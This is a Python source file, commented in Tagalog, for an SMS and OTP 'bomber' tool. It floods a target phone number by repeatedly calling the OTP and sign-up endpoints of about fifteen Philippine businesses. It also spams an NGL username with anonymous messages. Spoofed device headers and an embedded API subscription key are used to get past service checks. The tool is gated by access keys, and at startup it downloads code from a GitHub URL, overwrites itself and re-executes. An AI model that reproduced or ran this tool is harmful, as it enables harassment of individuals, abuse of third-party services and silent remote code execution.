import requests
import random
import string
import time
import re
import json
import os
import hashlib
import uuid
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Tuple, Optional
import logging
from dataclasses import dataclass

# ==================================================
# ⚠️  ANG LINK MO - NAKATAGO AT HINDI NA MAGBABAGO
# ==================================================
# Ilagay mo dito ang link mo, at HINDI NA ITO GAGALAWIN KAHIT ANO PANG GAWIN MO
# Ito ang link na binigay mo:
UPDATE_URL = "https://raw.githubusercontent.com/devmeow08/tool.py/refs/heads/main/tool.py"
# ==================================================

# ==================================================
# 🔐 SISTEMA NG KEY + DEVICE LOCK + AUTO UPDATE
# ==================================================
RECORD_FILE = "device_bindings.json"

# --- DITO MO ILALAGAY ANG MGA KEY AT LIMIT ---
# DITO KA LANG MAGBABAGO NG KEYS, WAG MO NA HAWAKAN ANG UPDATE_URL SA TAAS
VALID_KEYS = {
    "JOHN-1234": 5,       # Pwede sa 5 magkakaibang DEVICE/CP
    "MARK-5678": 3,       # Pwede sa 3 magkakaibang DEVICE/CP
    "ADMIN-9999": 999,    # Walang limit (ikaw lang dapat may alam nito)
    "USER-0001": 1        # Pwede sa 1 LANG na DEVICE/CP
}
# ==================================================

# 🚀 AUTO UPDATE FUNCTION
def check_for_update():
    try:
        print("\033[1;34m[⚙️] Tinitingnan kung may bagong update...\033[0m")
        # Kumuha ng bagong code mula sa internet
        response = requests.get(UPDATE_URL, timeout=10)
        if response.status_code == 200:
            new_code = response.text
            # Basahin ang laman ng kasalukuyang file
            current_file = os.path.abspath(__file__)
            with open(current_file, 'r', encoding='utf-8') as f:
                current_code = f.read()
            
            # ✅ BAGONG PANUNTUNAN: IKUMPELARA LANG ANG CODE SIMULA SA KEYS PAHABA
            # Para HINDI NA IKUMPELARA ANG UPDATE_URL, hindi na siya mag-iiba!
            marker = "# --- DITO MO ILALAGAY ANG MGA KEY AT LIMIT ---"
            if marker in new_code and marker in current_code:
                new_code_part = new_code.split(marker, 1)[1]
                current_code_part = current_code.split(marker, 1)[1]
            else:
                new_code_part = new_code
                current_code_part = current_code

            # Kung magkaiba lang sa bahagi ng KEYS at FEATURES, saka lang mag-update
            if new_code_part.strip() != current_code_part.strip():
                print("\033[1;32m[✅] MAY BAGONG UPDATE! Ini-install...\033[0m")
                with open(current_file, 'w', encoding='utf-8') as f:
                    f.write(new_code)
                print("\033[1;32m[✅] UPDATE TAPOS! Muling binubuksan ang programa...\033[0m")
                time.sleep(1.5)
                # I-restart ang programa gamit ang bagong file
                os.execv(sys.executable, ['python3'] + sys.argv)
            else:
                print("\033[1;33m[ℹ️] Nasa pinakabagong version na.\033[0m")
        else:
            print("\033[1;31m[❌] Hindi makakonekta sa update server. Gamit ang lumang version.\033[0m")
    except Exception as e:
        print(f"\033[1;31m[❌] Error sa pag-update: {e}\033[0m")
        print("\033[1;31m[⚠️] Itutuloy ang pagtakbo gamit ang kasalukuyang version...\033[0m")
    time.sleep(0.8)

# 🔑 DEVICE ID SYSTEM
def get_device_id():
    unique_id = str(uuid.getnode())
    return hashlib.md5(unique_id.encode()).hexdigest()

def load_records():
    if os.path.exists(RECORD_FILE):
        try:
            with open(RECORD_FILE, 'r') as f:
                return json.load(f)
        except: return {}
    return {}

def save_record(key, device_id):
    records = load_records()
    if key not in records:
        records[key] = []
    if device_id not in records[key]:
        records[key].append(device_id)
    with open(RECORD_FILE, 'w') as f:
        json.dump(records, f)

# ==================================================
# 🛠️ ANG TOOL MO (HINDI NA BINAGO ANG ITO)
# ==================================================

class Style:
    BRIGHT = '\033[1m'
    SKULL = '\033[0m'

W = '\033[1;37m'  # White
B = '\033[1;30m'  # Black
R = '\033[1;31m'  # Red
GR = '\033[1;32m' # Green
CY = '\033[1;36m' # Cyan

@dataclass
class APIResponse:
    service_name: str
    success: bool
    status_code: Optional[int] = None
    error_message: Optional[str] = None

class johnTool_SMS_SYSTEM:
    def __init__(self):
        self.user_usage = {}
        self.FINGERPRINT_VISITOR_ID = "TPt0yCuOFim3N3rzvrL1"
        self.FINGERPRINT_REQUEST_ID = "1757149666261.Rr1VvG"
        self.max_retries = 2
        self.retry_delay = 0.5
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = None
        self.number_to_send = ""
        self.formatted_num = ""
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        self.logger = logging.getLogger(__name__)

    def clear(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def random_string(self, length: int) -> str:
        chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
        return ''.join(random.choice(chars) for _ in range(length))
    
    def format_phone_number(self, number: str) -> str:
        return number.replace('0', '+63', 1) if number.startswith('0') else f'+63{number}'

    def make_api_request(self, api_call, *args, **kwargs) -> APIResponse:
        service_name = kwargs.get('service_name', 'Unknown')
        for attempt in range(self.max_retries + 1):
            try:
                result = api_call(*args)
                if len(result) == 3:
                    service_name, success, status_code = result
                    return APIResponse(service_name=service_name, success=success, status_code=status_code)
                else:
                    return APIResponse(service_name=service_name, success=False)
            except Exception:
                if attempt == self.max_retries:
                    return APIResponse(service_name=service_name, success=False)
                time.sleep(self.retry_delay)
        return APIResponse(service_name=service_name, success=False)

    # --- ORIGINAL PREMIUM SERVICES ---
    def send_s5_request(self, formatted_num: str):
        try:
            url = 'https://api.s5.com/player/api/v1/otp/request'
            boundary = "----WebKitFormBoundary" + self.random_string(16)
            data = f'--{boundary}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n{formatted_num}\r\n--{boundary}--\r\n'
            headers = {'content-type': f'multipart/form-data; boundary={boundary}'}
            r = requests.post(url, data=data, headers=headers, timeout=10)
            return "S5.com", 200 <= r.status_code < 300, r.status_code
        except: return "S5.com", False, None

    def send_xpress_request(self, formatted_num: str):
        try:
            url = "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp"
            data = {"FirstName": "toshi", "LastName": "premium", "Phone": formatted_num, "RoleIds": [4]}
            r = requests.post(url, json=data, timeout=10)
            return "Xpress PH", 200 <= r.status_code < 300, r.status_code
        except: return "Xpress PH", False, None

    def send_abenson_request(self, number_to_send: str):
        try:
            url = "https://api.mobile.abenson.com/api/public/membership/activate_otp"
            r = requests.post(url, data=f'contact_no={number_to_send}&login_token=undefined', timeout=10)
            return "Abenson", 200 <= r.status_code < 300, r.status_code
        except: return "Abenson", False, None

    def send_excellente_request(self, number_to_send: str):
        try:
            url = "https://api.excellenteralending.com/dllin/union/rehabilitation/dock"
            data = {"domain": number_to_send, "cat": "login", "financial": "efe35521e51f924efcad5d61d61072a9"}
            r = requests.post(url, json=data, timeout=10)
            return "Excellente Lending", 200 <= r.status_code < 300, r.status_code
        except: return "Excellente Lending", False, None

    def send_fortunepay_request(self, number_to_send: str):
        try:
            url = "https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register"
            num = number_to_send.replace('0', '', 1) if number_to_send.startswith('0') else number_to_send
            data = {"dialCode": "+63", "phoneNumber": num}
            r = requests.post(url, json=data, timeout=10)
            return "FortunePay", 200 <= r.status_code < 300, r.status_code
        except: return "FortunePay", False, None

    def send_wemove_request(self, number_to_send: str):
        try:
            url = "https://api.wemove.com.ph/auth/users"
            num = number_to_send.replace('0', '', 1) if number_to_send.startswith('0') else number_to_send
            data = {"phone_country": "+63", "phone_no": num}
            r = requests.post(url, json=data, timeout=10)
            return "WeMove", 200 <= r.status_code < 300, r.status_code
        except: return "WeMove", False, None

    def send_lbc_request(self, number_to_send: str):
        try:
            url = "https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification"
            num = number_to_send.replace('0', '', 1) if number_to_send.startswith('0') else number_to_send
            data = {'verification_type': 'mobile', 'client_contact_code': '+63', 'client_contact_no': num}
            r = requests.post(url, data=data, timeout=10)
            return "LBC", 200 <= r.status_code < 300, r.status_code
        except: return "LBC", False, None

    def send_pickup_coffee_request(self, formatted_num: str):
        try:
            url = "https://production.api.pickup-coffee.net/v2/customers/login"
            r = requests.post(url, json={"mobile_number": formatted_num, "login_method": "mobile_number"}, timeout=10)
            return "Pickup Coffee", 200 <= r.status_code < 300, r.status_code
        except: return "Pickup Coffee", False, None

    def send_honeyloan_request(self, number_to_send: str):
        try:
            url = "https://api.honeyloan.ph/api/client/registration/step-one"
            r = requests.post(url, json={"phone": number_to_send, "is_rights_block_accepted": 1}, timeout=10)
            return "HoneyLoan", 200 <= r.status_code < 300, r.status_code
        except: return "HoneyLoan", False, None

    def send_komo_request(self, number_to_send: str):
        try:
            url = "https://api.komo.ph/api/otp/v5/generate"
            r = requests.post(url, json={"mobile": number_to_send, "transactionType": 6}, timeout=10)
            return "Komo", 200 <= r.status_code < 300, r.status_code
        except: return "Komo", False, None

    # --- BAYAD CENTER (MAY RECAPTCHA NA, MADALAS ERROR) ---
    def send_bayadcenter_request(self, number_to_send: str):
        try:
            formatted_phone = number_to_send.lstrip('0') if number_to_send.startswith('0') else number_to_send
            bayad_phone = f"+63{formatted_phone}"
            
            headers = {
                "accept": 'application/json, text/plain, */*',
                "accept-language": 'en-US',
                "authorization": "",
                "content-type": 'application/json',
                "origin": 'https://www.online.bayad.com',
                "referer": 'https://www.online.bayad.com/',
                "sec-ch-ua": '"Chromium";v="127"',
                "sec-ch-ua-mobile": '?1',
                "user-agent": 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
            }
            
            email = self.random_string(10) + "@gmail.com"
            payload = {"mobileNumber": bayad_phone, "emailAddress": email}
            
            response = requests.post("https://api.online.bayad.com/api/sign-up/otp", headers=headers, json=payload, timeout=10)
            return "Bayad Center", 200 <= response.status_code < 300, response.status_code
        except: return "Bayad Center", False, None

    # --- EZLOAN (ERROR 405) ---
    def send_ezloan_request(self, number_to_send: str):
        try:
            formatted_phone = number_to_send.lstrip('0') if number_to_send.startswith('0') else number_to_send
            current_time = int(time.time() * 1000)
            
            headers = {
                'User-Agent': 'okhttp/4.9.2',
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'imei': self.random_string(16),
                'device': 'android',
                'brand': 'samsung',
                'model': 'SM-G998B',
                'blackbox': f'kGPGg{current_time}DCl3O8MVBR0',
            }
            
            data = {
                "businessId": "EZLOAN",
                "contactNumber": f"+63{formatted_phone}",
                "appsflyerIdentifier": f"{current_time}-{random.randint(1000000000000000000, 9999999999999999999)}"
            }
            
            response = requests.post("https://gateway.ezloancash.ph/security/auth/otp/request", headers=headers, json=data, timeout=8)
            return "EZLOAN", response.status_code == 200, response.status_code
        except Exception as e:
            return "EZLOAN", False, None

    # --- MWELL ✅ GUMAGANA PA ---
    def send_mwell_request(self, number_to_send: str):
        try:
            formatted_phone = number_to_send.lstrip('0') if number_to_send.startswith('0') else number_to_send
            
            headers = {
                'User-Agent': 'okhttp/4.11.0',
                'Accept-Encoding': 'gzip',
                'Content-Type': 'application/json',
                'ocp-apim-subscription-key': '0a57846786b34b0a89328c39f584892b',
                'x-app-version': '03.942.038',
                'x-device-type': 'android',
                'x-device-model': 'oneplus CPH2465',
                'x-timestamp': str(int(time.time() * 1000)),
                'x-request-id': self.random_string(16)
            }
            
            data = {"country": "PH", "phoneNumber": formatted_phone, "phoneNumberPrefix": "+63"}
            
            response = requests.post("https://gw.mwell.com.ph/api/v2/app/mwell/auth/sign/mobile-number", headers=headers, json=data, timeout=15)
            
            if response.status_code == 200:
                resp_json = response.json()
                if resp_json.get('c') == 200:
                    return "MWELL", True, response.status_code
            return "MWELL", False, response.status_code
        except Exception as e:
            return "MWELL", False, None

    # --- BOMB OTP ---
    def send_bombotp_request(self, number_to_send: str):
        try:
            formatted_phone = number_to_send.lstrip('0') if number_to_send.startswith('0') else number_to_send
            
            headers = {
                'User-Agent': 'OSIM/1.55.0 (Android 16; CPH2465)',
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'region': 'PH'
            }
            credentials = {"userName": formatted_phone, "phoneCode": "63", "password": f"TempPass{random.randint(1000, 9999)}!"}
            response = requests.post("https://prod.services.osim-cloud.com/identity/api/v1.0/account/register", headers=headers, json=credentials, timeout=8)
            return "BOMB OTP", response.status_code == 200, response.status_code
        except Exception as e:
            return "BOMB OTP", False, None

    # --- PEXX ---
    def send_pexx_request(self, number_to_send: str):
        try:
            formatted_phone = number_to_send.lstrip('0') if number_to_send.startswith('0') else number_to_send
            
            headers = {
                'User-Agent': 'okhttp/4.12.0',
                'Content-Type': 'application/json',
                'tid': self.random_string(11),
                'appversion': '3.0.14',
                'sentry-trace': self.random_string(32),
            }
            
            data = {"0": {"json": {"email": "", "areaCode": "+63", "phone": f"+63{formatted_phone}", "otpChannel": "TG", "otpUsage": "REGISTRATION"}}}
            
            response = requests.post("https://api.pexx.com/api/trpc/auth.sendSignupOtp?batch=1", headers=headers, json=data, timeout=20)
            return "PEXX", response.status_code == 200, response.status_code
        except Exception as e:
            return "PEXX", False, None

    # Lahat ng serbisyo
    def get_all_services(self) -> List[callable]:
        return [
            lambda: self.make_api_request(self.send_s5_request, self.formatted_num, service_name="S5.com"),
            lambda: self.make_api_request(self.send_xpress_request, self.formatted_num, service_name="Xpress PH"),
            lambda: self.make_api_request(self.send_abenson_request, self.number_to_send, service_name="Abenson"),
            lambda: self.make_api_request(self.send_excellente_request, self.number_to_send, service_name="Excellente Lending"),
            lambda: self.make_api_request(self.send_fortunepay_request, self.number_to_send, service_name="FortunePay"),
            lambda: self.make_api_request(self.send_wemove_request, self.number_to_send, service_name="WeMove"),
            lambda: self.make_api_request(self.send_lbc_request, self.number_to_send, service_name="LBC"),
            lambda: self.make_api_request(self.send_pickup_coffee_request, self.formatted_num, service_name="Pickup Coffee"),
            lambda: self.make_api_request(self.send_honeyloan_request, self.number_to_send, service_name="HoneyLoan"),
            lambda: self.make_api_request(self.send_komo_request, self.number_to_send, service_name="Komo"),
            lambda: self.make_api_request(self.send_bayadcenter_request, self.number_to_send, service_name="Bayad Center"),
            lambda: self.make_api_request(self.send_ezloan_request, self.number_to_send, service_name="EZLOAN"),
            lambda: self.make_api_request(self.send_mwell_request, self.number_to_send, service_name="MWELL"),
            lambda: self.make_api_request(self.send_bombotp_request, self.number_to_send, service_name="BOMB OTP"),
            lambda: self.make_api_request(self.send_pexx_request, self.number_to_send, service_name="PEXX"),
        ]

    # --- INDIVIDUAL SERVICES ---
    def get_lbc_only_service(self) -> List[callable]:
        return [lambda: self.make_api_request(self.send_lbc_request, self.number_to_send, service_name="LBC")]
    def get_s5_only_service(self) -> List[callable]:
        return [lambda: self.make_api_request(self.send_s5_request, self.formatted_num, service_name="S5.com")]
    def get_xpress_only_service(self) -> List[callable]:
        return [lambda: self.make_api_request(self.send_xpress_request, self.formatted_num, service_name="Xpress PH")]
    def get_abenson_only_service(self) -> List[callable]:
        return [lambda: self.make_api_request(self.send_abenson_request, self.number_to_send, service_name="Abenson")]
    def get_excellente_only_service(self) -> List[callable]:
        return [lambda: self.make_api_request(self.send_excellente_request, self.number_to_send, service_name="Excellente Lending")]
    def get_fortunepay_only_service(self) -> List[callable]:
        return [lambda: self.make_api_request(self.send_fortunepay_request, self.number_to_send, service_name="FortunePay")]
    def get_wemove_only_service(self) -> List[callable]:
        return [lambda: self.make_api_request(self.send_wemove_request, self.number_to_send, service_name="WeMove")]
    def get_pickupcoffee_only_service(self) -> List[callable]:
        return [lambda: self.make_api_request(self.send_pickup_coffee_request, self.formatted_num, service_name="Pickup Coffee")]
    def get_honeyloan_only_service(self) -> List[callable]:
        return [lambda: self.make_api_request(self.send_honeyloan_request, self.number_to_send, service_name="HoneyLoan")]
    def get_komo_only_service(self) -> List[callable]:
        return [lambda: self.make_api_request(self.send_komo_request, self.number_to_send, service_name="Komo")]
    def get_bayadcenter_only_service(self) -> List[callable]:
        return [lambda: self.make_api_request(self.send_bayadcenter_request, self.number_to_send, service_name="Bayad Center")]
    def get_ezloan_only_service(self) -> List[callable]:
        return [lambda: self.make_api_request(self.send_ezloan_request, self.number_to_send, service_name="EZLOAN")]
    def get_mwell_only_service(self) -> List[callable]:
        return [lambda: self.make_api_request(self.send_mwell_request, self.number_to_send, service_name="MWELL")]
    def get_bombotp_only_service(self) -> List[callable]:
        return [lambda: self.make_api_request(self.send_bombotp_request, self.number_to_send, service_name="BOMB OTP")]
    def get_pexx_only_service(self) -> List[callable]:
        return [lambda: self.make_api_request(self.send_pexx_request, self.number_to_send, service_name="PEXX")]

    def display_ui_menu(self):
        self.clear()
        banner = [
            " ███████╗███╗   ███╗███████╗",
            " ██╔════╝████╗ ████║██╔════╝",
            " ███████╗██╔████╔██║███████╗",
            " ╚════██║██║╚██╔╝██║╚════██║",
            " ███████║██║ ╚═╝ ██║███████║",
            " ╚══════╝╚═╝     ╚═╝╚══════╝",
            "",
            " ██████╗  ██████╗ ███╗   ███╗██████╗ ███████╗██████╗ ",
            " ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔════╝██╔══██╗",
            " ██████╔╝██║   ██║██╔████╔██║██████╔╝█████╗  ██████╔╝",
            " ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══╝  ██╔══██╗",
            " ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝███████╗██║  ██║",
            " ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝"
        ]
        for line in banner:
            print("\033[1;36m" + line + "\033[0m")
            
        print("\n           \033[1;31mMade By: John Michael:)\n")
        print("\033[1;33m [1] ✅ START")
        print("\033[1;31m [2] ❌ EXIT")

    def display_submenu(self):
        self.clear()
        print(f'{W}')
        print(f'{W}{B}{CY}{Style.BRIGHT} {Style.SKULL} {B}')
        print(f'{W}{GR}                          :::!~!!!!!:.')
        print(f'{W}{GR}                     .xUHWH!! !!?M88WHX:.')
        print(f'{W}{GR}                  .X*#M@$!  !X!M$$$$$WWx:')
        print(f'{W}{GR}                  :!!!!!!?H! :!$!$$$$$$$$8X:')
        print(f'{W}{GR}                :!~::!H!   ~.U$X!?W$$$$MM!')
        print(f'{W}{GR}                  ~!~!!!!~~ .:XW$$$U!!?$WMM!')
        print(f'{W}{GR}               !:~~~ .:!M*T#$$$WX??#MRRMMM!')
        print(f'{W}{GR}               ~?WuxiW*     *#$$$8!!!!??!!!')
        print(f'{W}{GR}             :X- M$$$$       *\'#T#$~!8$WUXU~')
        print(f'{W}{GR}          :%\'  ~%$Mm:         ~!~ ?$$$$$')
        print(f'{W}{GR}          :! .-   ~T$8xx.  .xWW- ~""##*\'\'')
        print(f'{W}{GR}  .....   -~~:<  !    ~?T$@@W@*?$    /\'')
        print(f'{W}{GR} W$@@M!!! .!~~ !!     .:XUW$W!~ \'*~:   :')
        print(f'{W}{GR} %^~~\'.:x%\'!!  !H:   !WM$$$$Ti.: .!WUnn!')
        print(f'{W}{GR} :::~:!. :X~ .: ?H.!u $$$$$$!W:U!T$M~')
        print(f'{W}{GR} .~~   :X@!.-~   ?@WTWo(\'*$W$TH$!\')')
        print(f'{W}{GR} Wi.~!X$?!-~    : ?$$$B$Wu(\'**$RM!)')
        print(f'{W}{GR} $R@i.#~ !     :   -$$$$$%$Mm$;')
        print(f'{W}{GR} ?MXT@Wx.~    :     ~##$$$M~')
        print(f'{W} ')
        banner = [
            "╔═╗╔╦╗╔═╗   ╔╦╗╔═╗╔╗╔╦ ╦",
            "╚═╗║║║╚═╗   ║║║║╣ ║║║║ ║",
            "╚═╝╩ ╩╚═╝   ╩ ╩╚═╝╝╚╝╚═╝"
        ]
        for line in banner:
            print(line)
    
        print("\n\033[1;33m [1]  ➤ RANDOM MESSAGES BOMB       [9]  ➤ Pickup Coffee")
        print("\033[1;33m [2]  ➤ LBC                        [10] ➤ HoneyLoan")
        print("\033[1;33m [3]  ➤ S5.com                     [11] ➤ Kumu")
        print("\033[1;33m [4]  ➤ Xpress PH                  [12] ➤ Bayad Center")
        print("\033[1;33m [5]  ➤ Abenson                    [13] ➤ EZLOAN")
        print("\033[1;33m [6]  ➤ Excellente Lending         [14] ➤ MWELL ✅")
        print("\033[1;33m [7]  ➤ FortunePay                 [15] ➤ BOMB OTP")
        print("\033[1;33m [8]  ➤ WeMove                     [16] ➤ PEXX")
        print("\033[1;33m [17] ➤ NGL BOMBER ✅\n")
        print("\033[1;31m ─────────────────────────")
        print("\033[1;31m [18] ❌ BACK TO MAIN MENU")
        print("\033[1;31m ─────────────────────────\n")

    def run_bombing_logic(self, services_list):
        num = input("\033[1;32m(⧽) Enter target Number: \033[0m")
        try:
            total = int(input("\033[1;32m(⧽) Enter bomb count: \033[0m"))
        except: total = 1
        
        self.number_to_send = num
        self.formatted_num = self.format_phone_number(num)
        all_services = services_list
        
        print(f"\n\033[1;37mInitiating... (Target: {num})\n\033[0m")
        self.total_requests = 0
        
        with ThreadPoolExecutor(max_workers=8) as executor:
            completed = 0
            while completed < total:
                futures = [executor.submit(srv) for srv in all_services]
                for future in as_completed(futures):
                    if completed >= total: break
                    api_response = future.result()
                    self.total_requests += 1
                    completed += 1
                    status = "\033[1;32mSUCCESS\033[0m" if api_response.success else "\033[1;31mFAILED\033[0m"
                    code = f"({api_response.status_code})" if api_response.status_code else ""
                    print(f"[{self.total_requests:03d}] {api_response.service_name}: {status} {code}")
        
        input("\nPress Enter to return to menu...")

    def start(self):
        while True:
            self.display_ui_menu()
            choice = input("\n\033[1;32m(⧽) Select your choice: \033[0m")
            if choice == "1":
                print("\nLoading, please wait...")
                for i in range(21):
                    bar = "■" * i + "□" * (20 - i)
                    print(f"\r\033[1;34m[{bar}] {i*5}%\033[0m", end="")
                    time.sleep(0.2)
                print("\n\033[1;32mComplete!\033[0m")
                time.sleep(0.1)
                
                while True:
                    self.display_submenu()
                    sub_choice = input("\033[1;32m(⧽) Select your choice: \033[0m")
                    if sub_choice == "1":
                        self.run_bombing_logic(self.get_all_services())
                    elif sub_choice == "2":
                        self.run_bombing_logic(self.get_lbc_only_service())
                    elif sub_choice == "3":
                        self.run_bombing_logic(self.get_s5_only_service())
                    elif sub_choice == "4":
                        self.run_bombing_logic(self.get_xpress_only_service())
                    elif sub_choice == "5":
                        self.run_bombing_logic(self.get_abenson_only_service())
                    elif sub_choice == "6":
                        self.run_bombing_logic(self.get_excellente_only_service())
                    elif sub_choice == "7":
                        self.run_bombing_logic(self.get_fortunepay_only_service())
                    elif sub_choice == "8":
                        self.run_bombing_logic(self.get_wemove_only_service())
                    elif sub_choice == "9":
                        self.run_bombing_logic(self.get_pickupcoffee_only_service())
                    elif sub_choice == "10":
                        self.run_bombing_logic(self.get_honeyloan_only_service())
                    elif sub_choice == "11":
                        self.run_bombing_logic(self.get_komo_only_service())
                    elif sub_choice == "12":
                        self.run_bombing_logic(self.get_bayadcenter_only_service())
                    elif sub_choice == "13":
                        self.run_bombing_logic(self.get_ezloan_only_service())
                    elif sub_choice == "14":
                        self.run_bombing_logic(self.get_mwell_only_service())
                    elif sub_choice == "15":
                        self.run_bombing_logic(self.get_bombotp_only_service())
                    elif sub_choice == "16":
                        self.run_bombing_logic(self.get_pexx_only_service())
                    elif sub_choice == "17":
                        ngl = NGL_BOMBER()
                        ngl.start_bombing()
                    elif sub_choice == "18":
                        break
                    else:
                        print("\n\033[1;31mInvalid selection!\033[0m")
                        time.sleep(1)
            elif choice == "2":
                break
            else:
                print("\n\033[1;31mInvalid selection!\033[0m")
                time.sleep(1)

# --- NGL BOMBER CLASS ---
class NGL_BOMBER:
    def __init__(self):
        self.total_requests = 0
        self.success = 0
        self.failed = 0

    def clear(self):
        os.system('clear' if os.name == 'posix' else 'cls')

    def random_string(self, length: int) -> str:
        chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
        return ''.join(random.choice(chars) for _ in range(length))

    def send_ngl_request(self, username: str, message: str):
        try:
            url = "https://ngl.link/api/submit"
            headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
                "Accept": "*/*",
                "Origin": "https://ngl.link",
                "Referer": f"https://ngl.link/{username}",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest"
            }
            payload = {"username": username, "question": message, "deviceId": self.random_string(32), "gameSlug": "", "referrer": ""}
            response = requests.post(url, data=payload, headers=headers, timeout=15)
            return True if response.status_code == 200 else False, response.status_code
        except Exception as e:
            return False, None

    def start_bombing(self):
        self.clear()
        banner = [
        f"{CY}",
        "███╗   ██╗ ██████╗ ██╗     ",
        "████╗  ██║██╔════╝ ██║     ",
        "██╔██╗ ██║██║  ███╗██║     ",
        "██║╚██╗██║██║   ██║██║     ",
        "██║ ╚████║╚██████╔╝███████╗",
        "╚═╝  ╚═══╝ ╚═════╝ ╚══════╝",
        f"{CY}─────────────────────────",
        f"{R} Made by: John Michael",
        f"{R}           NGL BOM",
        f"{CY}─────────────────────────"
        ]
        for line in banner: print(line)

        print(f"\n{W}[{CY}+{W}] {GR}SETTINGS⚙️{W}")
        target_user = input(f"{W}└─➤ {CY}Enter target username: {GR}")
        target_msg = input(f"{W}└─➤ {CY}Enter your message: {GR}")
        try: bomb_count = int(input(f"{W}└─➤ {CY}Count Bomb: {GR}"))
        except: bomb_count = 50; print(f"{R}⚠ Invalid input, set to 50 default{W}")

        if not target_user or not target_msg:
            print(f"{R}❌ Username or Message cannot be empty!{W}")
            return

        print(f"\n{CY}========================================={W}")
        print(f"{GR}TARGET  : {W}@{target_user}")
        print(f"{GR}MESSAGE : {W}{target_msg}")
        print(f"{GR}COUNT   : {W}{bomb_count}")
        print(f"{CY}========================================={W}\n")

        self.total_requests = 0; self.success = 0; self.failed = 0
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(self.send_ngl_request, target_user, target_msg) for _ in range(bomb_count)]
            for future in as_completed(futures):
                self.total_requests += 1
                res, code = future.result()
                if res: self.success += 1; status = f"{GR}SUCCESS{W}"
                else: self.failed += 1; status = f"{R}FAILED{W}"
                print(f"[{self.total_requests:03d}/{bomb_count}] STATUS: {status} | CODE: {code if code else 'ERROR'}")

        print(f"\n{CY}========================================={W}")
        print(f"{GR}✅ COMPLETED! TOTAL: {self.total_requests} | SUCCESS: {self.success} | FAILED: {self.failed}")
        print(f"{CY}========================================={W}")
        input(f"\n{W}Press Enter to return to menu...")


# ==================================================
# 🏁 SIMULA NG PAGPAPATAKBO
# ==================================================
if __name__ == "__main__":
    # 1. Tingnan muna kung may update
    check_for_update()

    # 2. Login System
    print("="*40)
    print("          🔐 SISTEMA NG PAGPASOK          ")
    print("="*40)
    user_input_key = input("🔑 Ilagay ang Access Key: ").strip()

    # Check kung tama ang key
    if user_input_key not in VALID_KEYS:
        print("❌ MALI O WALANG BALIDONG KEY! ACCESS DENIED.")
        exit()

    current_device_id = get_device_id()
    records = load_records()
    max_allowed = VALID_KEYS[user_input_key]

    # Check kung may nakatali nang device
    if user_input_key in records:
        if current_device_id in records[user_input_key]:
            print(f"✅ TAMA ANG KEY! WELCOME BACK MAY-ARI NG DEVICE NA ITO.")
            print("🚀 PAGPAPATAKBO NG SISTEMA...\n")
            app = johnTool_SMS_SYSTEM()
            app.start()
        else:
            print(f"❌ KEY NA ITO AY NAKATALI NA SA IBANG CELLPHONE/DEVICE!")
            exit()
    else:
        used_count = len(records.get(user_input_key, []))
        if used_count >= max_allowed:
            print(f"⚠️  UBOS NA ANG LIMIT NG KEY NA ITO!")
            exit()
        
        save_record(user_input_key, current_device_id)
        print(f"✅ MATAGUMPAY NA NAKA-REGISTER ANG DEVICE MO SA KEY NA ITO!")
        print("🚀 PAGPAPATAKBO NG SISTEMA...\n")
        app = johnTool_SMS_SYSTEM()
        app.start()
